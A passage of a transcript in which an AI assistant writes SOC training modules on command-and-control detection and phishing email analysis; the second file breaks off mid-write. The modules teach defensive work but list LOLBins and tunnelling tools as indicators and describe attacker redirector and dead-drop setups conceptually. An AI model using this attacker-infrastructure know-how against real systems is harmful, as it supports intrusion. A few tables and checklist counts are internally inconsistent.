    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 104.0s)

_Thinking:_

Now let me create Module 15 - Command and Control.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 15: Command and Control (C2)\n\n**Priority: P1 — C2 = attacker's lifeline. Detecting it = detecting the breach.**\n\n---\n\n## 15.1 What is C2?\n\n**Command and Control (C2 / C&C)** — The communication channel between compromised host(s) and attacker's infrastructure. Used for:\n- Sending commands / tasking\n- Receiving results / exfiltrated data\n- Updating malware / deploying modules\n- Maintaining persistence / heartbeat\n\n**Without C2, malware is just a stray binary. With C2, it's an active breach.**\n\n---\n\n## 15.2 C2 Communication Models\n\n| Model | Description | Examples |\n|-------|-------------|----------|\n| **Centralized** | Single C2 server (or small cluster) | Traditional botnets, simple malware |\n| **Tiered / Proxy** | Victims → Proxy/Redirector → Real C2 | APT, sophisticated actors |\n| **P2P (Peer-to-Peer)** | No central server; nodes communicate | Gameover Zeus, ZeroAccess, Sality |\n| **Domain Fronting** | Legit CDN domain (cloudfront.net) fronts malicious backend | Cobalt Strike, custom |\n| **Fast Flux** | Rapidly changing IPs for single domain | Botnets, banking trojans |\n| **Dead Drop Resolver** | C2 info posted to legit site (GitHub, Twitter, blockchain) | APT29, APT41, Lazarus |\n| **Multi-Channel** | Simultaneous HTTP + DNS + TCP | Redundancy, evasion |\n\n---\n\n## 15.3 C2 Protocols & Channels\n\n### 1. HTTP/HTTPS C2 (Most Common)\n| Aspect | Details |\n|--------|---------|\n| **Protocol** | HTTP/1.1, HTTP/2, HTTP/3 (QUIC) |\n| **Ports** | 80, 443, 8080, 8443, 8000, 8888, 9000+ |\n| **Methods** | GET (beacon), POST (data exfil/task results) |\n| **Encryption** | TLS (HTTPS) + Optional payload encryption (AES, RC4, XOR) |\n| **Beaconing** | Regular GET/POST to `/checkin`, `/task`, `/beacon` |\n| **Headers** | Custom: `X-Command`, `X-Session`, `Cookie` with session |\n| **User-Agent** | Often spoofed (Chrome, Windows Update) or distinctive (python, Go) |\n\n**Common Frameworks**: Cobalt Strike (HTTP/HTTPS), Sliver, Mythic, Covenant, Metasploit (HTTP), PosHC2, Empire.\n\n### 2. DNS C2\n| Aspect | Details |\n|--------|---------|\n| **Protocol** | DNS (UDP 53, TCP 53, DoH 443, DoT 853) |\n| **Query Types** | A, AAAA, TXT, CNAME, MX, NULL, SRV |\n| **Encoding** | Subdomain (exfil), TXT/NULL response (commands) |\n| **Tunneling** | iodine, dnscat2, Cobalt Strike DNS, custom |\n| **Advantages** | Rarely blocked, works in air-gapped (via recursive), hard to inspect |\n| **Detection** | High entropy subdomains, high query volume, NXDOMAIN rate, TXT/NULL usage |\n\n### 3. TCP/UDP Raw Socket C2\n| Aspect | Details |\n|--------|---------|\n| **Protocol** | Custom binary protocol over TCP/UDP |\n| **Ports** | High ports (>1024), non-standard (4444, 5555, 6666, 8080, 9999) |\n| **Encryption** | Custom (AES, ChaCha20, XOR) or TLS (mbedTLS, OpenSSL) |\n| **Frameworks** | Cobalt Strike (TCP), Sliver (TCP/mTLS), Covenant (TCP), Metasploit (Meterpreter TCP), custom |\n| **Detection** | Non-HTTP on 443/80, JA3 anomalies, long-lived connections, regular heartbeats |\n\n### 4. Legitimate Service Abuse (Living-off-the-Land C2)\n| Service | Mechanism | Examples |\n|---------|-----------|----------|\n| **Cloud Storage** | Files in OneDrive, Google Drive, Dropbox, AWS S3 | Graph API, REST API, CLI tools |\n| **Email** | IMAP/SMTP/OWA for commands/results | Outlook, Gmail, custom |\n| **Messaging** | Telegram Bot API, Discord Webhooks, Slack, Matrix | Bots, webhooks |\n| **Social Media** | Twitter, GitHub, Reddit, Pastebin | Posts, gists, repos |\n| **Blockchain** | Smart contracts, transaction data | Ethereum, Bitcoin OP_RETURN |\n| **IoT/OT Protocols** | MQTT, CoAP, Modbus | Industrial malware |\n\n---\n\n## 15.4 C2 Frameworks — Know the Big Ones\n\n| Framework | Language | Channels | Notable Features |\n|-----------|----------|----------|------------------|\n| **Cobalt Strike** | C++ (Beacon) | HTTP, HTTPS, DNS, SMB (named pipes), TCP | **Industry standard for Red Team**, Malleable C2 profiles, Artifact Kit |\n| **Sliver** | Go | HTTP, HTTPS, DNS, mTLS, WireGuard, SSH | Modern, cross-platform, mutual TLS, arm64 |\n| **Metasploit / Meterpreter** | Ruby/C | HTTP, HTTPS, TCP, Named Pipes | Vast module library, session migration |\n| **Covenant** | C#/.NET | HTTP, HTTPS, WebSocket | .NET native, dynamic compilation |\n| **Empire / Starkiller** | PowerShell/Python | HTTP, HTTPS, DNS | PowerShell agents, GUI |\n| **PoshC2** | Python/PowerShell | HTTP, HTTPS, DNS, SMB | UK NCSC, PowerShell-first |\n| **Mythic** | Go/Python | Plugin-based (HTTP, DNS, WebSocket, etc.) | Modular, containerized |\n| **Brute Ratel (BRC4)** | C++ | HTTP, HTTPS, DNS, TCP | Evasion-focused, custom crypto |\n| **Havoc** | C++/Go | HTTP, HTTPS, DNS, TCP | Open-source, modern UI |\n\n---\n\n## 15.5 C2 Indicators — What L1 Detects\n\n### Network Indicators\n| Indicator | Detection Source |\n|-----------|------------------|\n| **Beaconing** | Regular interval (jitter), long duration, small packets | NetFlow, Zeek conn.log, EDR netconns, Proxy |\n| **Known C2 IP/Domain** | Threat intel match | Firewall, Proxy, DNS, EDR, TI platform |\n| **Suspicious Domain** | Newly registered, DGA-like, suspicious TLD, low reputation | DNS logs, Proxy, TI |\n| **JA3/JA3S Anomaly** | Known malicious fingerprints (Cobalt Strike, Meterpreter, Sliver) | Zeek ssl.log, EDR TLS, Proxy |\n| **Certificate Anomalies** | Self-signed, expired, mismatched CN/SAN, Let's Encrypt for C2 | Zeek ssl.log, Proxy, EDR |\n| **Non-Standard Ports** | HTTPS on 8080, 8443, 9443; SSH on 443; Custom high ports | Firewall, NetFlow, Zeek |\n| **Long-Lived Connections** | Hours/days (WebSocket, HTTP/2, custom TCP) | Zeek conn.log, EDR, NetFlow |\n| **Data Exfil Patterns** | Large uploads, regular intervals, cloud storage APIs | Proxy, Firewall, DLP, NetFlow |\n\n### Host Indicators (EDR/Sysmon)\n| Indicator | Source |\n|-----------|--------|\n| **Suspicious Process Network** | PowerShell, Rundll32, Regsvr32, Mshta, Certutil, Wscript making outbound connections | Sysmon EID 3, EDR |\n| **Injected Process Network** | Legitimate process (svchost, explorer, browser) making unusual connections | Sysmon EID 3 + EID 8/10, EDR |\n| **Scheduled Task/Service Beacon** | Task/Service running periodically, making network calls | Sysmon EID 1/3/4/5, 4698 |\n| **WMI Event Consumer Network** | WMI consumer executing network commands | Sysmon EID 19/20/21 |\n| **Memory Injection + Network** | CreateRemoteThread + subsequent network from target | Sysmon EID 8 + EID 3 |\n\n---\n\n## 15.6 Beaconing Detection — Deep Dive\n\n### Beacon Characteristics\n```\nBEACON = Periodic, Automated, Command-Response\n         │\n         ├── Interval: 30s - 24h (typical 60s, 5m, 1h)\n         ├── Jitter: ±10-30% (to evade simple threshold)\n         ├── Payload: Small (heartbeat) or Large (exfil/results)\n         ├── Protocol: HTTP(S), DNS, TCP, Custom\n         └── Persistence: Survives reboot (service, task, WMI, Run key)\n```\n\n### Detection Algorithms\n\n#### 1. Regularity Scoring (Coefficient of Variation)\n```python\n# CV = Standard Deviation / Mean\n# CV < 0.3 = Highly regular (beaconing)\n# CV 0.3-0.5 = Moderate (jittered beacon)\n# CV > 0.5 = Irregular (human)\n\nintervals = [t2-t1, t3-t2, t4-t3, ...]\nmean = statistics.mean(intervals)\nstdev = statistics.stdev(intervals)\ncv = stdev / mean\n```\n\n#### 2. Frequency Domain (FFT)\n```python\n# Convert timestamps to binary signal (1=connection, 0=no connection)\n# FFT → Find dominant frequency\n# Peak at 1/60Hz = 60-second beacon\n```\n\n#### 3. Machine Learning (Isolation Forest)\n```python\nfeatures = [\n    'mean_interval', 'std_interval', 'cv_interval',\n    'mean_bytes_up', 'mean_bytes_down', 'byte_ratio',\n    'dest_port_entropy', 'dest_ip_count', 'conn_duration',\n    'hour_of_day_entropy', 'day_of_week_entropy'\n]\n# Train on normal → Flag outliers\n```\n\n### KQL Beaconing Query (Enhanced)\n```kql\n// Multi-protocol beaconing detection\nlet beacon_candidates = \n    union \n    (Sysmon | where EventID == 3 | project TimeGenerated, SourceIp, DestinationIp, DestinationPort, Protocol, ProcessImage, Computer, User),\n    (FirewallLogs | project TimeGenerated, SourceIp=SrcIp, DestinationIp=DstIp, DestinationPort=DstPort, Protocol=Protocol, ProcessImage=\"\", Computer, User=\"\"),\n    (ProxyLogs | where cs_method in (\"GET\",\"POST\") | project TimeGenerated, SourceIp=c_ip, DestinationIp=cs_host, DestinationPort=80, Protocol=\"HTTP\", ProcessImage=\"\", Computer, User=cs_username)\n;\nbeacon_candidates\n| where DestinationPort in (80, 443, 8080, 8443, 53) or Protocol in (\"TCP\", \"UDP\")\n| summarize \n    Count=count(), \n    Intervals=make_list(TimeGenerated),\n    BytesUp=make_list(OrigBytes),\n    BytesDown=make_list(RespBytes),\n    Destinations=make_set(strcat(DestinationIp, \":\", DestinationPort)),\n    Processes=make_set(ProcessImage),\n    Users=make_set(User)\n  by SourceIp, Computer, bin(TimeGenerated, 2h)\n| where Count >= 6\n| mv-expand Intervals\n| order by SourceIp, Intervals asc\n| extend PrevInterval = prev(Intervals)\n| extend DeltaSeconds = datetime_diff('second', Intervals, PrevInterval)\n| where isnotnull(DeltaSeconds)\n| summarize \n    AvgDelta=avg(DeltaSeconds), \n    StdDelta=stdev(DeltaSeconds), \n    CV=stdev(DeltaSeconds)/avg(DeltaSeconds),\n    MinDelta=min(DeltaSeconds), \n    MaxDelta=max(DeltaSeconds),\n    Count=count(),\n    TotalBytesUp=sum(BytesUp),\n    TotalBytesDown=sum(BytesDown)\n  by SourceIp, Computer, DestinationIp, DestinationPort\n| where CV < 0.35 and AvgDelta between (30 .. 86400)  // 30s to 24h\n| where Count >= 6\n| extend BeaconScore = (1 - CV) * log10(Count) * (TotalBytesDown / (TotalBytesUp + 1))\n| order by BeaconScore desc\n```\n\n---\n\n## 15.7 C2 Infrastructure — Attacker OPSEC\n\n### Redirectors / Proxies\n```\nVictim ──► Redirector (VPS, Cloud) ──► Real C2 (Team Server)\n                │\n                ├── Nginx/Apache/HAProxy/Caddy\n                ├── TLS termination (valid cert)\n                ├── Header manipulation (hide framework signatures)\n                ├── IP allowlist (only victim IPs)\n                └── Logging minimal\n```\n\n### Domain Fronting (Legacy but Conceptual)\n```\nVictim ──► CDN (cloudfront.net, azureedge.net) ──► Real C2\n                │\n                ├── Host Header: evil.c2.com\n                ├── SNI: d123.cloudfront.net\n                └── CDN routes to evil.c2.com origin\n```\n**Note**: Major CDNs (Cloudflare, AWS, Azure, Google) have largely mitigated this.\n\n### Dead Drop Resolvers\n```\nMalware ──► Legit Site (GitHub, Twitter, Blockchain) ──► Reads C2 IP/Domain\n                │\n                ├── GitHub Gist/Repo: \"config.txt\" with encrypted C2 list\n                ├── Twitter: Tweet with encoded C2 in bio/username\n                ├── Blockchain: Transaction OP_RETURN with C2 data\n                └── DNS TXT: Legit domain with C2 in TXT record\n```\n\n---\n\n## 15.8 C2 Takedown & Disruption (SOC Role)\n\n| Action | Description | L1 Involvement |\n|--------|-------------|----------------|\n| **Block IOC** | Firewall/Proxy/DNS block on IP, Domain, Hash | Execute immediately on TP |\n| **Sinkhole** | Redirect malicious domain to controlled server | Coordinate with Net/IT, monitor connections |\n| **Takedown Request** | Report to registrar, hosting, CERT | Provide evidence, TI team leads |\n| **Credential Rotation** | Reset compromised creds, revoke tokens | L1 identifies scope, L2/IR executes |\n| **Network Segmentation** | Isolate VLAN, enforce jump hosts | L1 identifies lateral paths, Net implements |\n| **EDR Policy Update** | New hash, behavior, custom rule | L1 submits, Detection Eng implements |\n\n---\n\n## 15.9 Interview Questions for This Module\n\n1. **What is C2 and why is it critical to detect?**\n   - Command & Control = attacker's communication channel to compromised hosts. Without C2, malware is inert. Detecting C2 = detecting active breach.\n\n2. **Name 5 C2 communication channels and their protocols.**\n   - HTTP/HTTPS (80/443), DNS (53/DoH/DoT), Raw TCP/UDP (high ports), Cloud Storage APIs (443), Email/IMAP/SMTP (993/587/25), Messaging (Telegram/Discord/Slack).\n\n3. **What is beaconing and how do you detect it statistically?**\n   - Regular periodic communication. Detect via Coefficient of Variation (CV = StdDev/Mean < 0.3), FFT frequency analysis, or ML isolation forest on interval/byte features.\n\n4. **What is Cobalt Strike and why is it significant?**\n   - Commercial Red Team framework (Beacon payload). Widely used by APT/criminals. Malleable C2 profiles mimic legit traffic. Distinct JA3, default pipes, sleep/jitter patterns.\n\n5. **How does DNS tunneling work for C2?**\n   - Encode data in DNS subdomains (exfil) or TXT/NULL responses (commands). Uses legitimate DNS recursion. Hard to block (port 53 often open).\n\n6. **What are \"Living-off-the-Land\" C2 channels?**\n   - Abusing legitimate services: Cloud storage (OneDrive, GDrive), Email (OWA/IMAP), Messaging (Telegram/Discord), Social Media (GitHub/Twitter), Blockchain.\n\n7. **What is a redirector in C2 infrastructure?**\n   - Intermediate proxy (VPS/cloud) between victim and real C2. Hides team server, terminates TLS, filters IPs, manipulates headers.\n\n8. **What JA3 fingerprints are associated with common C2 frameworks?**\n   - Cobalt Strike: `ae4edc6faf64d08308082ad26be60767` (varies by profile), Meterpreter: `72a589da586844d7f0818ce684948eea`, Sliver: varies (Go TLS stack).\n\n9. **How do you disrupt C2 once detected?**\n   - Block IOCs (IP/domain/hash) at firewall/proxy/DNS, sinkhole domains, coordinate takedown, rotate credentials, segment network, update EDR rules.\n\n10. **What host indicators suggest a process is beaconing?**\n    - Suspicious process (PowerShell, LOLBin, injected svchost) making regular outbound connections, scheduled task/service with network activity, WMI consumer executing net commands.\n\n---\n\n## 15.10 Study Checklist for Module 15\n\n- [ ] Define C2 and explain why it's the \"lifeline\" of a breach\n- [ ] Compare 6 C2 communication models (Centralized, Tiered, P2P, Domain Fronting, Fast Flux, Dead Drop)\n- [ ] Detail 4 protocol channels: HTTP/S, DNS, Raw TCP/UDP, Legit Service Abuse\n- [ ] List 8 major C2 frameworks with languages and channels\n- [ ] Identify 10+ network C2 indicators and 5+ host C2 indicators\n- [ ] Explain beaconing characteristics (interval, jitter, payload, protocol, persistence)\n- [ ] Implement 3 beaconing detection methods: CV, FFT, ML\n- [ ] Write enhanced KQL for multi-protocol beaconing detection\n- [ ] Describe C2 infrastructure OPSEC (redirectors, domain fronting, dead drops)\n- [ ] List 6 C2 disruption actions with L1 role\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 16 — Phishing and Email Security*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/15-command-and-control.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 25.3s)

_Thinking:_

Good, Module 15 is done. Now let me continue with Module 16 - Phishing and Email Security.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 360.8s)

_Thinking:_



_Thinking:_

Now let me create Module 16 - Phishing and Email Security.

**Tool: write**

**Input:**
```json
{
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/16-phishing-email-security.md",
  "content": "# Module 16: Phishing and Email Security\n\n**Priority: P0 — #1 initial access vector. L1 investigates phishing daily.**\n\n---\n\n## 16.1 Phishing Taxonomy\n\n| Type | Target | Method | Sophistication |\n|------|--------|--------|----------------|\n| **Bulk Phishing** | Mass (millions) | Generic lure (invoice, package, password reset) | Low |\n| **Spear Phishing** | Specific individual/org | Personalized (name, role, project, recent event) | Medium-High |\n| **Whaling** | C-suite / VIP | Highly tailored, business context | Very High |\n| **Business Email Compromise (BEC)** | Finance/HR/Exec | Impersonation, no malware, social engineering | High |\n| **Clone Phishing** | Previous legitimate email recipient | Clone legit email, swap link/attachment | Medium |\n| **Vishing (Voice)** | Phone | Caller ID spoof, urgency, authority impersonation | Medium |\n| **Smishing (SMS)** | Mobile | Short links, urgency, 2FA codes | Medium |\n| **QR Phishing (Quishing)** | Mobile | QR code in email/physical → phishing site | Emerging |\n| **Consent Phishing** | OAuth/App consent | Malicious app requests permissions (Graph, Gmail) | High |\n\n---\n\n## 16.2 Email Anatomy — Headers & Body\n\n### Critical Headers for Investigation\n| Header | Purpose | Phishing Indicator |\n|--------|---------|-------------------|\n| **From** | Displayed sender | Spoofed display name, mismatched address |\n| **Return-Path** | Bounce address (SMTP MAIL FROM) | **True sender domain** (check SPF) |\n| **Reply-To** | Where replies go | Different from From (reply hijack) |\n| **Received** | Hop-by-hop path (bottom = origin) | **Trace source IP, hops, delays** |\n| **Authentication-Results** | SPF/DKIM/DMARC verdict | `spf=fail`, `dkim=fail`, `dmarc=fail` |\n| **DKIM-Signature** | Cryptographic signature | `d=domain`, `s=selector`, `bh=hash`, `b=sig` |\n| **ARC-Authentication-Results** | Forwarding chain auth | Preserves auth through forwards |\n| **X-Originating-IP** | Client IP (some providers) | Geo mismatch, known bad |\n| **X-Mailer / User-Agent** | Sending software | Bulk mailers, scripts, unusual |\n| **Message-ID** | Unique identifier | Pattern analysis, tracking |\n| **Date** | Timestamp | Timezone mismatch, future/past |\n| **Subject** | Social engineering hook | Urgency, fear, curiosity, reward |\n| **List-Unsubscribe** | Mailing list header | Often absent in phishing |\n\n### Received Header Parsing (Bottom-Up)\n```\nReceived: from mail.example.com (mail.example.com [192.0.2.1])\n    by mx.recipient.com (Postfix) with ESMTPS id ABC123\n    for <victim@recipient.com>; Mon, 15 Jan 2024 10:30:00 +0000 (UTC)\n    (version=TLS1.3 cipher=TLS_AES_256_GCM_SHA384 bits=256)\n```\n- **Bottom-most** = Original sender's mail server\n- **Each hop** adds a Received header\n- **Analyze**: Source IP, HELO/EHLO name, TLS version/cipher, delay between hops\n\n---\n\n## 16.3 Email Authentication — SPF, DKIM, DMARC\n\n### SPF (Sender Policy Framework) — RFC 7208\n| Mechanism | Meaning |\n|-----------|---------|\n| `v=spf1` | Version |\n| `ip4:192.0.2.0/24` | Allowed IPv4 range |\n| `ip6:2001:db8::/32` | Allowed IPv6 range |\n| `include:_spf.google.com` | Include another domain's SPF |\n| `a` / `mx` | Domain's A/MX records |\n| `~all` | **SoftFail** (accept but mark) |\n| `-all` | **HardFail** (reject) |\n| `?all` | Neutral |\n| `+all` | **Pass all (DANGEROUS)** |\n\n**SPF Failure**: Sending IP not in authorized list → `spf=fail` (hardfail) or `spf=softfail`.\n\n### DKIM (DomainKeys Identified Mail) — RFC 6376\n| Tag | Meaning |\n|-----|---------|\n| `v=1` | Version |\n| `a=rsa-sha256` | Algorithm |\n| `d=example.com` | **Signing domain** |\n| `s=selector1` | **Selector** (DNS: `selector1._domainkey.example.com`) |\n| `h=from:to:subject:date` | **Signed headers** |\n| `bh=base64hash` | Body hash |\n| `b=base64signature` | Signature |\n\n**DKIM Verification**: Retrieve public key from DNS → Verify signature matches body + signed headers.\n\n### DMARC (Domain-based Message Authentication, Reporting, Conformance) — RFC 7489\n| Tag | Meaning |\n|-----|---------|\n| `v=DMARC1` | Version |\n| `p=none` / `quarantine` / `reject` | **Policy** (monitor / spam / reject) |\n| `sp=quarantine` | Subdomain policy |\n| `pct=100` | Percentage to apply |\n| `rua=mailto:dmarc@example.com` | Aggregate reports (XML) |\n| `ruf=mailto:dmarc-forensic@example.com` | Forensic reports (eml) |\n| `adkim=r` / `s` | DKIM alignment (relaxed/strict) |\n| `aspf=r` / `s` | SPF alignment (relaxed/strict) |\n\n**DMARC Pass**: (SPF Pass + SPF Aligned) OR (DKIM Pass + DKIM Aligned).\n**Alignment**: `From` domain == `Return-Path` domain (SPF) OR `From` domain == `d=` domain (DKIM).\n\n---\n\n## 16.4 Phishing Email Analysis Workflow\n\n### Alert: \"Phishing Email Delivered - Credential Harvesting\"\n```\n1. EXTRACT EMAIL (EML/MSG) FROM GATEWAY / USER REPORT / SANDBOX\n   - Gateway: Proofpoint, Mimecast, Cisco ESA, Microsoft Defender, Google\n   - User Report: Phish alert button, forward to security@\n   - Sandbox: Detonation results (URL clicks, attachment behavior)\n\n2. PARSE HEADERS (Use: msgparser, emlx, Outlook, online tools)\n   - From: \"IT Support\" <it-support@company-services.xyz>\n   - Return-Path: <bounce@attacker-domain.com>\n   - Reply-To: <credential-harvest@evil.com>\n   - Received chain: \n     1. mx.recipient.com ← mail.attacker-domain.com [203.0.113.45]\n     2. mail.attacker-domain.com ← localhost [127.0.0.1]\n   - Authentication-Results: spf=fail (domain=attacker-domain.com), dkim=fail, dmarc=fail\n   - X-Mailer: PHP/8.1.12 (not corporate mailer)\n\n3. ANALYZE SENDER INFRASTRUCTURE\n   - Source IP: 203.0.113.45\n     - VT: 15/92 (phishing, bulk mailer)\n     - AbuseIPDB: 89% confidence\n     - ASN: AS12345 (Bulletproof Hosting)\n     - Geo: Russia (corporate HQ in US)\n   - Domain: attacker-domain.com\n     - Registered: 2024-01-10 (5 days ago)\n     - Registrar: Namecheap\n     - NS: ns1.bulletproof-hosting.net\n     - MX: mail.attacker-domain.com\n   - Return-Path domain: attacker-domain.com (matches)\n\n4. ANALYZE CONTENT\n   - Subject: \"URGENT: Password Expires Today - Action Required\"\n   - Body: HTML with corporate logo, \"Click here to reset\"\n   - Links: \n     - `https://company-services.xyz/reset?token=xyz` → Redirects to `https://evil-phish-site.com/credential-harvest`\n     - Link text: \"Reset Password\" (hover shows different URL)\n   - Attachments: None (credential phishing)\n   - Language: Urgency, threat of account loss, poor grammar\n\n5. CHECK RECIPIENTS & SCOPE\n   - To: 47 recipients (Finance, HR, IT)\n   - CC/BCC: None\n   - Delivery: 44 delivered, 3 blocked by gateway\n   - Clicks: 12 users clicked (gateway URL rewrite logs)\n   - Credentials Entered: 5 users (gateway sandbox / credential monitoring)\n\n6. THREAT INTEL 